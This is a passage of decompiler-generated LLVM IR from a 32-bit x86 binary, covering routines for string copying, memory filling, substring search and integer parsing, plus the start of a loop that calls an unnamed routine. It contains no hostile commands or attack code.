  store i32 %v4_8052606, i32* %edx.global-to-local, align 4
  %v2_805260a = load i8, i8* %tmp15, align 1
  %v3_805260a = icmp eq i8 %v2_805260a, 0
  br i1 %v3_805260a, label %dec_label_pc_8052634, label %dec_label_pc_805260f

dec_label_pc_805260f:                             ; preds = %dec_label_pc_8052600
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052611

dec_label_pc_8052611:                             ; preds = %dec_label_pc_8052611, %dec_label_pc_805260f
  %v0_8052611 = phi i32 [ %v1_8052611, %dec_label_pc_8052611 ], [ 0, %dec_label_pc_805260f ]
  %v1_8052611 = add i32 %v0_8052611, 1
  store i32 %v1_8052611, i32* %esi.global-to-local, align 4
  %v2_8052612 = add i32 %v1_8052611, %arg2
  %v3_8052612 = inttoptr i32 %v2_8052612 to i8*
  %v4_8052612 = load i8, i8* %v3_8052612, align 1
  %v5_8052612 = icmp eq i8 %v4_8052612, 0
  %v1_8052616 = icmp eq i1 %v5_8052612, false
  br i1 %v1_8052616, label %dec_label_pc_8052611, label %dec_label_pc_8052618

dec_label_pc_8052618:                             ; preds = %dec_label_pc_8052611
  %v10_8052618 = icmp eq i32 %v0_8052611, -2
  br i1 %v10_8052618, label %dec_label_pc_805262f, label %dec_label_pc_805261d

dec_label_pc_805261d:                             ; preds = %dec_label_pc_8052618
  store i32 %v4_8052606, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %v1_8052611, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052623

dec_label_pc_8052623:                             ; preds = %dec_label_pc_8052634, %dec_label_pc_805261d, %dec_label_pc_8052623.dec_label_pc_8052623_crit_edge
  %v2_8052626 = phi i32 [ %v1_8052629, %dec_label_pc_8052623.dec_label_pc_8052623_crit_edge ], [ %v4_8052606, %dec_label_pc_805261d ], [ %v4_8052606, %dec_label_pc_8052634 ]
  %v0_8052625 = phi i32 [ %v0_805262a, %dec_label_pc_8052623.dec_label_pc_8052623_crit_edge ], [ %v1_8052611, %dec_label_pc_805261d ], [ 0, %dec_label_pc_8052634 ]
  %v4_8052623 = phi i32 [ %v4_8052623.pre, %dec_label_pc_8052623.dec_label_pc_8052623_crit_edge ], [ %arg2, %dec_label_pc_805261d ], [ %arg2, %dec_label_pc_8052634 ]
  %v0_8052623 = phi i32 [ %v1_8052628, %dec_label_pc_8052623.dec_label_pc_8052623_crit_edge ], [ %arg2, %dec_label_pc_805261d ], [ %arg2, %dec_label_pc_8052634 ]
  %v1_8052623 = inttoptr i32 %v0_8052623 to i8*
  %v2_8052623 = load i8, i8* %v1_8052623, align 1
  %v3_8052623 = zext i8 %v2_8052623 to i32
  %v5_8052623 = and i32 %v4_8052623, -256
  %v6_8052623 = or i32 %v3_8052623, %v5_8052623
  store i32 %v6_8052623, i32* %eax.global-to-local, align 4
  %v1_8052625 = add i32 %v0_8052625, -1
  store i32 %v1_8052625, i32* %edx.global-to-local, align 4
  %v3_8052626 = inttoptr i32 %v2_8052626 to i8*
  store i8 %v2_8052623, i8* %v3_8052626, align 1
  %v0_8052628 = load i32, i32* @ecx, align 4
  %v1_8052628 = add i32 %v0_8052628, 1
  store i32 %v1_8052628, i32* @ecx, align 4
  %v0_8052629 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052629 = add i32 %v0_8052629, 1
  store i32 %v1_8052629, i32* %ebx.global-to-local, align 4
  %v0_805262a = load i32, i32* %edx.global-to-local, align 4
  %v10_805262a = icmp eq i32 %v0_805262a, -1
  %v1_805262d = icmp eq i1 %v10_805262a, false
  br i1 %v1_805262d, label %dec_label_pc_8052623.dec_label_pc_8052623_crit_edge, label %dec_label_pc_805262f.loopexit

dec_label_pc_8052623.dec_label_pc_8052623_crit_edge: ; preds = %dec_label_pc_8052623
  %v4_8052623.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052623

dec_label_pc_805262f.loopexit:                    ; preds = %dec_label_pc_8052623
  %v0_805262f.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8052631.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805262f

dec_label_pc_805262f:                             ; preds = %dec_label_pc_805262f.loopexit, %dec_label_pc_8052618
  %v2_8052631 = phi i32 [ %v2_8052631.pre, %dec_label_pc_805262f.loopexit ], [ %v0_8052601, %dec_label_pc_8052618 ]
  %v0_805262f = phi i32 [ %v0_805262f.pre, %dec_label_pc_805262f.loopexit ], [ %v1_8052611, %dec_label_pc_8052618 ]
  store i32 %v0_805262f, i32* %eax.global-to-local, align 4
  store i32 %v2_8052631, i32* @ebx, align 4
  ret i32 %v0_805262f

dec_label_pc_8052634:                             ; preds = %dec_label_pc_8052600
  store i32 %v4_8052606, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052623

; uselistorder directives
  uselistorder i32 %v0_805262f, { 1, 0 }
  uselistorder i32 %v1_8052629, { 1, 0 }
  uselistorder i32 %v1_8052628, { 1, 0 }
  uselistorder i32 %v1_8052611, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v4_8052606, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_8052623, { 0, 2, 1 }
}

define i32 @function_8052640(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052640:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052641 = load i32, i32* @ebx, align 4
  store i32 %v0_8052641, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_805264e = icmp eq i32 %arg3, 0
  br i1 %v1_805264e, label %dec_label_pc_805265f, label %dec_label_pc_8052652

dec_label_pc_8052652:                             ; preds = %dec_label_pc_8052640
  store i32 0, i32* %edx.global-to-local, align 4
  %v3_805265411 = inttoptr i32 %arg2 to i8*
  %v4_805265412 = load i8, i8* %v3_805265411, align 1
  %v6_805265714 = inttoptr i32 %arg1 to i8*
  store i8 %v4_805265412, i8* %v6_805265714, align 1
  %v0_805265a15 = load i32, i32* %edx.global-to-local, align 4
  %v1_805265a16 = add i32 %v0_805265a15, 1
  store i32 %v1_805265a16, i32* %edx.global-to-local, align 4
  %v12_805265b17 = icmp eq i32 %v1_805265a16, %arg3
  %v1_805265d18 = icmp eq i1 %v12_805265b17, false
  br i1 %v1_805265d18, label %dec_label_pc_8052654.dec_label_pc_8052654_crit_edge, label %dec_label_pc_805265f.loopexit

dec_label_pc_8052654.dec_label_pc_8052654_crit_edge: ; preds = %dec_label_pc_8052652, %dec_label_pc_8052654.dec_label_pc_8052654_crit_edge
  %v1_805265a20 = phi i32 [ %v1_805265a, %dec_label_pc_8052654.dec_label_pc_8052654_crit_edge ], [ %v1_805265a16, %dec_label_pc_8052652 ]
  %v1_8052654.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8052657.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8052654 = add i32 %v1_805265a20, %v1_8052654.pre
  %v3_8052654 = inttoptr i32 %v2_8052654 to i8*
  %v4_8052654 = load i8, i8* %v3_8052654, align 1
  %v5_8052657 = add i32 %v1_805265a20, %v4_8052657.pre
  %v6_8052657 = inttoptr i32 %v5_8052657 to i8*
  store i8 %v4_8052654, i8* %v6_8052657, align 1
  %v0_805265a = load i32, i32* %edx.global-to-local, align 4
  %v1_805265a = add i32 %v0_805265a, 1
  store i32 %v1_805265a, i32* %edx.global-to-local, align 4
  %v12_805265b = icmp eq i32 %v1_805265a, %arg3
  %v1_805265d = icmp eq i1 %v12_805265b, false
  br i1 %v1_805265d, label %dec_label_pc_8052654.dec_label_pc_8052654_crit_edge, label %dec_label_pc_805265f.loopexit

dec_label_pc_805265f.loopexit:                    ; preds = %dec_label_pc_8052654.dec_label_pc_8052654_crit_edge, %dec_label_pc_8052652
  %v4_8052654.lcssa = phi i8 [ %v4_805265412, %dec_label_pc_8052652 ], [ %v4_8052654, %dec_label_pc_8052654.dec_label_pc_8052654_crit_edge ]
  %phitmp = sext i8 %v4_8052654.lcssa to i32
  %v2_805265f.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805265f

dec_label_pc_805265f:                             ; preds = %dec_label_pc_805265f.loopexit, %dec_label_pc_8052640
  %v2_805265f = phi i32 [ %v0_8052641, %dec_label_pc_8052640 ], [ %v2_805265f.pre, %dec_label_pc_805265f.loopexit ]
  %.1 = phi i32 [ 0, %dec_label_pc_8052640 ], [ %phitmp, %dec_label_pc_805265f.loopexit ]
  store i32 %v2_805265f, i32* @ebx, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v1_805265a, { 1, 2, 0 }
  uselistorder i32 %v1_805265a20, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052654.dec_label_pc_8052654_crit_edge, { 1, 0 }
}

define i32 @function_8052670(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052670:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8052678 = icmp eq i32 %arg2, 0
  br i1 %v1_8052678, label %dec_label_pc_8052670.dec_label_pc_8052689_crit_edge, label %dec_label_pc_805267c

dec_label_pc_8052670.dec_label_pc_8052689_crit_edge: ; preds = %dec_label_pc_8052670
  %v0_8052689.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8052689

dec_label_pc_805267c:                             ; preds = %dec_label_pc_8052670
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_80526805 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_80526805, align 1
  %v0_80526846 = load i32, i32* %eax.global-to-local, align 4
  %v1_80526847 = add i32 %v0_80526846, 1
  store i32 %v1_80526847, i32* %eax.global-to-local, align 4
  %v12_80526858 = icmp eq i32 %v1_80526847, %arg2
  %v1_80526879 = icmp eq i1 %v12_80526858, false
  br i1 %v1_80526879, label %dec_label_pc_8052680.dec_label_pc_8052680_crit_edge, label %dec_label_pc_8052689

dec_label_pc_8052680.dec_label_pc_8052680_crit_edge: ; preds = %dec_label_pc_805267c, %dec_label_pc_8052680.dec_label_pc_8052680_crit_edge
  %v1_805268410 = phi i32 [ %v1_8052684, %dec_label_pc_8052680.dec_label_pc_8052680_crit_edge ], [ %v1_80526847, %dec_label_pc_805267c ]
  %v1_8052680.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052680 = add i32 %v1_805268410, %v1_8052680.pre
  %v3_8052680 = inttoptr i32 %v2_8052680 to i8*
  store i8 0, i8* %v3_8052680, align 1
  %v0_8052684 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052684 = add i32 %v0_8052684, 1
  store i32 %v1_8052684, i32* %eax.global-to-local, align 4
  %v12_8052685 = icmp eq i32 %v1_8052684, %arg2
  %v1_8052687 = icmp eq i1 %v12_8052685, false
  br i1 %v1_8052687, label %dec_label_pc_8052680.dec_label_pc_8052680_crit_edge, label %dec_label_pc_8052689

dec_label_pc_8052689:                             ; preds = %dec_label_pc_805267c, %dec_label_pc_8052680.dec_label_pc_8052680_crit_edge, %dec_label_pc_8052670.dec_label_pc_8052689_crit_edge
  %v0_8052689 = phi i32 [ %v0_8052689.pre, %dec_label_pc_8052670.dec_label_pc_8052689_crit_edge ], [ %v1_80526847, %dec_label_pc_805267c ], [ %v1_8052684, %dec_label_pc_8052680.dec_label_pc_8052680_crit_edge ]
  ret i32 %v0_8052689

; uselistorder directives
  uselistorder i32 %v1_8052684, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052689, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052680.dec_label_pc_8052680_crit_edge, { 1, 0 }
}

define i32 @function_8052690() local_unnamed_addr {
dec_label_pc_8052690:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* @ecx, align 4
  %v7_80526a5 = icmp sgt i32 %tmp9, %tmp10
  br i1 %v7_80526a5, label %dec_label_pc_80526a7, label %dec_label_pc_80526b0

dec_label_pc_80526a7:                             ; preds = %dec_label_pc_80526c2, %dec_label_pc_8052690, %dec_label_pc_80526b0
  br label %dec_label_pc_80526aa

dec_label_pc_80526aa:                             ; preds = %dec_label_pc_80526d5, %dec_label_pc_80526a7
  %storemerge = phi i32 [ -1, %dec_label_pc_80526a7 ], [ %v0_80526c3, %dec_label_pc_80526d5 ]
  ret i32 %storemerge

dec_label_pc_80526b0:                             ; preds = %dec_label_pc_8052690
  %tmp17 = icmp slt i32 %tmp10, 1
  br i1 %tmp17, label %dec_label_pc_80526a7, label %dec_label_pc_80526b4

dec_label_pc_80526b4:                             ; preds = %dec_label_pc_80526b0
  %v2_80526cc = add i32 %tmp, -1
  br label %dec_label_pc_80526c8

dec_label_pc_80526c0:                             ; preds = %dec_label_pc_80526c8
  br label %dec_label_pc_80526c2

dec_label_pc_80526c2:                             ; preds = %dec_label_pc_80526d5, %dec_label_pc_80526c0
  %v2_80526d03 = phi i32 [ %v1_80526d5, %dec_label_pc_80526d5 ], [ 0, %dec_label_pc_80526c0 ]
  %v1_80526c2 = add i32 %v0_80526c2, 1
  %v1_80526c3 = add i32 %v0_80526c3, 1
  %v12_80526c4 = icmp eq i32 %tmp10, %v1_80526c2
  br i1 %v12_80526c4, label %dec_label_pc_80526a7, label %dec_label_pc_80526c8

dec_label_pc_80526c8:                             ; preds = %dec_label_pc_80526c2, %dec_label_pc_80526b4
  %v0_80526c2 = phi i32 [ %v1_80526c2, %dec_label_pc_80526c2 ], [ 0, %dec_label_pc_80526b4 ]
  %v0_80526d5 = phi i32 [ %v2_80526d03, %dec_label_pc_80526c2 ], [ 0, %dec_label_pc_80526b4 ]
  %v0_80526c3 = phi i32 [ %v1_80526c3, %dec_label_pc_80526c2 ], [ 1, %dec_label_pc_80526b4 ]
  %v3_80526cc = add i32 %v2_80526cc, %v0_80526c3
  %v4_80526cc = inttoptr i32 %v3_80526cc to i8*
  %v5_80526cc = load i8, i8* %v4_80526cc, align 1
  %v4_80526d0 = add i32 %v0_80526d5, %tmp8
  %v5_80526d0 = inttoptr i32 %v4_80526d0 to i8*
  %v6_80526d0 = load i8, i8* %v5_80526d0, align 1
  %v17_80526d0 = icmp eq i8 %v5_80526cc, %v6_80526d0
  %v1_80526d3 = icmp eq i1 %v17_80526d0, false
  br i1 %v1_80526d3, label %dec_label_pc_80526c0, label %dec_label_pc_80526d5

dec_label_pc_80526d5:                             ; preds = %dec_label_pc_80526c8
  %v1_80526d5 = add i32 %v0_80526d5, 1
  %v12_80526d6 = icmp eq i32 %tmp9, %v1_80526d5
  %v1_80526d8 = icmp eq i1 %v12_80526d6, false
  br i1 %v1_80526d8, label %dec_label_pc_80526c2, label %dec_label_pc_80526aa

; uselistorder directives
  uselistorder i32 %v0_80526c3, { 2, 0, 1 }
  uselistorder i32 %v0_80526d5, { 1, 0 }
  uselistorder i32 %v1_80526c2, { 1, 0 }
  uselistorder label %dec_label_pc_80526a7, { 0, 2, 1 }
}

define i32 @function_80526e0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80526e0:
  %v4_80526e7 = ptrtoint i8* %arg1 to i32
  %v4_80526f0.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80526f0

dec_label_pc_80526f0:                             ; preds = %dec_label_pc_8052704, %dec_label_pc_8052700, %dec_label_pc_80526f0, %dec_label_pc_80526e0
  %v4_80526f0 = phi i32 [ %v4_80526f0.pre, %dec_label_pc_80526e0 ], [ %v6_80526f0, %dec_label_pc_80526f0 ], [ %v6_80526f0, %dec_label_pc_8052700 ], [ %v6_80526f0, %dec_label_pc_8052704 ]
  %v0_80526f2 = phi i32 [ %v4_80526e7, %dec_label_pc_80526e0 ], [ %v1_80526f2, %dec_label_pc_80526f0 ], [ %v1_80526f2, %dec_label_pc_8052700 ], [ %v1_80526f2, %dec_label_pc_8052704 ]
  %v1_80526f0 = inttoptr i32 %v0_80526f2 to i8*
  %v2_80526f0 = load i8, i8* %v1_80526f0, align 1
  %v3_80526f0 = zext i8 %v2_80526f0 to i32
  %v5_80526f0 = and i32 %v4_80526f0, -256
  %v6_80526f0 = or i32 %v3_80526f0, %v5_80526f0
  %v1_80526f2 = add i32 %v0_80526f2, 1
  %v7_80526fc = icmp eq i8 %v2_80526f0, 32
  br i1 %v7_80526fc, label %dec_label_pc_80526f0, label %dec_label_pc_8052700

dec_label_pc_8052700:                             ; preds = %dec_label_pc_80526f0
  %v10_8052700 = icmp eq i8 %v2_80526f0, 9
  br i1 %v10_8052700, label %dec_label_pc_80526f0, label %dec_label_pc_8052704

dec_label_pc_8052704:                             ; preds = %dec_label_pc_8052700
  %v10_8052704 = icmp eq i8 %v2_80526f0, 10
  br i1 %v10_8052704, label %dec_label_pc_80526f0, label %dec_label_pc_8052708

dec_label_pc_8052708:                             ; preds = %dec_label_pc_8052704
  %tmp41 = sext i32 %arg2 to i64
  %v10_8052708 = icmp eq i8 %v2_80526f0, 45
  br i1 %v10_8052708, label %dec_label_pc_80527bd, label %dec_label_pc_8052711

dec_label_pc_8052711:                             ; preds = %dec_label_pc_8052708
  %v10_8052711 = icmp eq i8 %v2_80526f0, 43
  br i1 %v10_8052711, label %dec_label_pc_80527ed, label %dec_label_pc_805271a

dec_label_pc_805271a:                             ; preds = %dec_label_pc_8052711, %dec_label_pc_80527ed
  %v0_805276430 = phi i32 [ %v1_80526f2, %dec_label_pc_8052711 ], [ %v1_80527f0, %dec_label_pc_80527ed ]
  %v0_805279016.in = phi i8 [ %v2_80526f0, %dec_label_pc_8052711 ], [ %v2_80527ed, %dec_label_pc_80527ed ]
  %v2_805276e9 = phi i8 [ %v2_80526f0, %dec_label_pc_8052711 ], [ %v2_80527ed, %dec_label_pc_80527ed ]
  br label %dec_label_pc_8052727

dec_label_pc_8052727:                             ; preds = %dec_label_pc_80527bd, %dec_label_pc_805271a
  %v0_805276429 = phi i32 [ %v1_80527c5, %dec_label_pc_80527bd ], [ %v0_805276430, %dec_label_pc_805271a ]
  %v0_805279015.in = phi i8 [ %v2_80527bd, %dec_label_pc_80527bd ], [ %v0_805279016.in, %dec_label_pc_805271a ]
  %v2_805276e8 = phi i8 [ %v2_80527bd, %dec_label_pc_80527bd ], [ %v2_805276e9, %dec_label_pc_805271a ]
  %v0_8052727 = phi i64 [ 2147483648, %dec_label_pc_80527bd ], [ 2147483647, %dec_label_pc_805271a ]
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_80527bd ], [ 0, %dec_label_pc_805271a ]
  %v12_805272b = udiv i64 %v0_8052727, %tmp41
  %v13_805272b = trunc i64 %v12_805272b to i32
  %v14_805272b = urem i64 %v0_8052727, %tmp41
  %v15_805272b = trunc i64 %v14_805272b to i32
  br label %dec_label_pc_805276e

dec_label_pc_8052740:                             ; preds = %dec_label_pc_805276e
  %v1_8052740 = add nsw i32 %v0_8052740, -48
  %v7_8052747 = icmp slt i32 %v1_8052740, %arg2
  br i1 %v7_8052747, label %dec_label_pc_8052749, label %dec_label_pc_805279a

dec_label_pc_8052749:                             ; preds = %dec_label_pc_8052740, %dec_label_pc_8052790
  %v1_8052761 = phi i32 [ %v1_8052740, %dec_label_pc_8052740 ], [ %v2_8052792, %dec_label_pc_8052790 ]
  %v2_8052749 = icmp slt i32 %v0_8052749, 0
  br i1 %v2_8052749, label %dec_label_pc_80527b8, label %dec_label_pc_805274d

dec_label_pc_805274d:                             ; preds = %dec_label_pc_8052749
  %tmp42 = icmp ugt i32 %v0_805274d, %v13_805272b
  br i1 %tmp42, label %dec_label_pc_80527b8, label %dec_label_pc_8052753

dec_label_pc_8052753:                             ; preds = %dec_label_pc_805274d
  %v15_805274d = icmp eq i32 %v0_805274d, %v13_805272b
  br i1 %v15_805274d, label %dec_label_pc_80527b2, label %dec_label_pc_8052755

dec_label_pc_8052755:                             ; preds = %dec_label_pc_80527b2, %dec_label_pc_8052753
  %v4_805275e = mul i32 %v1_805275e, %arg2
  %v2_8052761 = add i32 %v1_8052761, %v4_805275e
  br label %dec_label_pc_8052764

dec_label_pc_8052764:                             ; preds = %dec_label_pc_80527b8, %dec_label_pc_8052755
  %v1_805275e26 = phi i32 [ %v1_805275e, %dec_label_pc_80527b8 ], [ %v2_8052761, %dec_label_pc_8052755 ]
  %v0_80527a220 = phi i32 [ %v0_805274d, %dec_label_pc_80527b8 ], [ %v2_8052761, %dec_label_pc_8052755 ]
  %v0_805279a19 = phi i32 [ -1, %dec_label_pc_80527b8 ], [ 1, %dec_label_pc_8052755 ]
  %v1_8052764 = inttoptr i32 %v0_8052764 to i8*
  %v2_8052764 = load i8, i8* %v1_8052764, align 1
  %v1_805276a = add i32 %v0_8052764, 1
  br label %dec_label_pc_805276e

dec_label_pc_805276e:                             ; preds = %dec_label_pc_8052727, %dec_label_pc_8052764
  %v0_8052764 = phi i32 [ %v0_805276429, %dec_label_pc_8052727 ], [ %v1_805276a, %dec_label_pc_8052764 ]
  %v1_805275e = phi i32 [ 0, %dec_label_pc_8052727 ], [ %v1_805275e26, %dec_label_pc_8052764 ]
  %v0_805274d = phi i32 [ 0, %dec_label_pc_8052727 ], [ %v0_80527a220, %dec_label_pc_8052764 ]
  %v0_8052749 = phi i32 [ 0, %dec_label_pc_8052727 ], [ %v0_805279a19, %dec_label_pc_8052764 ]
  %v0_8052740.in = phi i8 [ %v0_805279015.in, %dec_label_pc_8052727 ], [ %v2_8052764, %dec_label_pc_8052764 ]
  %v2_805276e = phi i8 [ %v2_805276e8, %dec_label_pc_8052727 ], [ %v2_8052764, %dec_label_pc_8052764 ]
  %v0_8052740 = sext i8 %v0_8052740.in to i32
  %v1_8052771 = add i8 %v2_805276e, -48
  %tmp43 = icmp ult i8 %v1_8052771, 10
  br i1 %tmp43, label %dec_label_pc_8052740, label %dec_label_pc_8052778

dec_label_pc_8052778:                             ; preds = %dec_label_pc_805276e
  %v1_8052778 = add i8 %v2_805276e, -65
  store i32 55, i32* @ecx, align 4
  %tmp44 = icmp ult i8 %v1_8052778, 26
  br i1 %tmp44, label %dec_label_pc_8052790, label %dec_label_pc_8052784

dec_label_pc_8052784:                             ; preds = %dec_label_pc_8052778
  %v1_8052784 = add i8 %v2_805276e, -97
  %tmp45 = icmp ult i8 %v1_8052784, 26
  br i1 %tmp45, label %dec_label_pc_805278b, label %dec_label_pc_805279a

dec_label_pc_805278b:                             ; preds = %dec_label_pc_8052784
  store i32 87, i32* @ecx, align 4
  br label %dec_label_pc_8052790

dec_label_pc_8052790:                             ; preds = %dec_label_pc_8052778, %dec_label_pc_805278b
  %v1_8052792 = phi i32 [ 55, %dec_label_pc_8052778 ], [ 87, %dec_label_pc_805278b ]
  %v2_8052792 = sub nsw i32 %v0_8052740, %v1_8052792
  %v7_8052798 = icmp slt i32 %v2_8052792, %arg2
  br i1 %v7_8052798, label %dec_label_pc_8052749, label %dec_label_pc_805279a

dec_label_pc_805279a:                             ; preds = %dec_label_pc_8052740, %dec_label_pc_8052784, %dec_label_pc_8052790
  %v2_805279a = icmp slt i32 %v0_8052749, 0
  br i1 %v2_805279a, label %dec_label_pc_80527d9, label %dec_label_pc_805279e

dec_label_pc_805279e:                             ; preds = %dec_label_pc_805279a
  store i32 %stack_var_-20.0, i32* @ecx, align 4
  %v1_80527a4 = icmp eq i32 %stack_var_-20.0, 0
  br i1 %v1_80527a4, label %dec_label_pc_80527aa, label %dec_label_pc_80527a8

dec_label_pc_80527a8:                             ; preds = %dec_label_pc_805279e
  %v1_80527a8 = sub i32 0, %v0_805274d
  br label %dec_label_pc_80527aa

dec_label_pc_80527aa:                             ; preds = %dec_label_pc_805279e, %dec_label_pc_80527a8
  %v0_80527b1 = phi i32 [ %v0_805274d, %dec_label_pc_805279e ], [ %v1_80527a8, %dec_label_pc_80527a8 ]
  ret i32 %v0_80527b1

dec_label_pc_80527b2:                             ; preds = %dec_label_pc_8052753
  %v5_80527b2 = sub i32 %v1_8052761, %v15_805272b
  %v11_80527b2 = xor i32 %v1_8052761, %v15_805272b
  %v12_80527b2 = xor i32 %v5_80527b2, %v1_8052761
  %v13_80527b2 = and i32 %v12_80527b2, %v11_80527b2
  %v14_80527b2 = icmp slt i32 %v13_80527b2, 0
  %v15_80527b2 = icmp eq i32 %v5_80527b2, 0
  %v16_80527b2 = icmp slt i32 %v5_80527b2, 0
  %v3_80527b6 = icmp ne i1 %v16_80527b2, %v14_80527b2
  %v4_80527b6 = or i1 %v15_80527b2, %v3_80527b6
  br i1 %v4_80527b6, label %dec_label_pc_8052755, label %dec_label_pc_80527b8

dec_label_pc_80527b8:                             ; preds = %dec_label_pc_805274d, %dec_label_pc_80527b2, %dec_label_pc_8052749
  br label %dec_label_pc_8052764

dec_label_pc_80527bd:                             ; preds = %dec_label_pc_8052708
  %v1_80527bd = inttoptr i32 %v1_80526f2 to i8*
  %v2_80527bd = load i8, i8* %v1_80527bd, align 1
  %v1_80527c5 = add i32 %v0_80526f2, 2
  br label %dec_label_pc_8052727

dec_label_pc_80527d9:                             ; preds = %dec_label_pc_805279a
  %v8_80527d9 = icmp eq i32 %stack_var_-20.0, 0
  %v2_80527de = zext i1 %v8_80527d9 to i32
  %v1_80527e33 = or i32 %v2_80527de, -2147483648
  ret i32 %v1_80527e33

dec_label_pc_80527ed:                             ; preds = %dec_label_pc_8052711
  %v1_80527ed = inttoptr i32 %v1_80526f2 to i8*
  %v2_80527ed = load i8, i8* %v1_80527ed, align 1
  %v1_80527f0 = add i32 %v0_80526f2, 2
  br label %dec_label_pc_805271a

; uselistorder directives
  uselistorder i32 %v5_80527b2, { 1, 2, 0 }
  uselistorder i32 %v2_8052792, { 1, 0 }
  uselistorder i8 %v2_8052764, { 1, 0 }
  uselistorder i32 %v2_8052761, { 1, 0 }
  uselistorder i32 %v1_8052761, { 0, 1, 3, 2 }
  uselistorder i32 %v13_805272b, { 1, 0 }
  uselistorder i32 %v1_80526f2, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_80526f0, { 2, 1, 0 }
  uselistorder i8 %v2_80526f0, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 %v0_80526f2, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 4, 6, 5, 1, 7, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80527b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80527aa, { 1, 0 }
  uselistorder label %dec_label_pc_805279a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052790, { 1, 0 }
  uselistorder label %dec_label_pc_805276e, { 1, 0 }
  uselistorder label %dec_label_pc_8052749, { 1, 0 }
  uselistorder label %dec_label_pc_805271a, { 1, 0 }
}

define i32 @function_8052800(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052800:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8052801 = load i32, i32* @edi, align 4
  %v0_8052803 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @edi, align 4
  %v0_8052815.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8052815

dec_label_pc_8052815:                             ; preds = %dec_label_pc_805282d.dec_label_pc_8052815_crit_edge, %dec_label_pc_8052800
  %v0_805281c = phi i32 [ %v0_805281c.pre, %dec_label_pc_805282d.dec_label_pc_8052815_crit_edge ], [ %arg3, %dec_label_pc_8052800 ]
  %v1_8052816 = phi i32 [ %v1_8052828, %dec_label_pc_805282d.dec_label_pc_8052815_crit_edge ], [ 0, %dec_label_pc_8052800 ]
  %v0_8052816 = phi i32 [ %v1_805282d, %dec_label_pc_805282d.dec_label_pc_8052815_crit_edge ], [ %arg1, %dec_label_pc_8052800 ]
  %v0_8052815 = phi i32 [ %v1_8052825, %dec_label_pc_805282d.dec_label_pc_8052815_crit_edge ], [ %v0_8052815.pre, %dec_label_pc_8052800 ]
  %v2_8052816 = add i32 %v0_8052816, %v1_8052816
  %v4_805281d = inttoptr i32 %v2_8052816 to i32*
  %v5_805281d = call i32 @function_8052d1c(i32 %v0_805281c, i32* %v4_805281d, i32 1, i32 %v0_8052815)
  %v1_8052825 = add i32 %v5_805281d, -1
  %v8_8052825 = icmp eq i32 %v1_8052825, 0
  %v1_8052826 = icmp eq i1 %v8_8052825, false
  %v0_8052834.pre = load i32, i32* @ebx, align 4
  br i1 %v1_8052826, label %dec_label_pc_8052834, label %dec_label_pc_8052828

dec_label_pc_8052828:                             ; preds = %dec_label_pc_8052815
  %v1_8052828 = add i32 %v0_8052834.pre, 1
  store i32 %v1_8052828, i32* @ebx, align 4
  %v0_8052829 = load i32, i32* %ebp.global-to-local, align 4
  %v7_805282b = icmp sgt i32 %v0_8052829, %v1_8052828
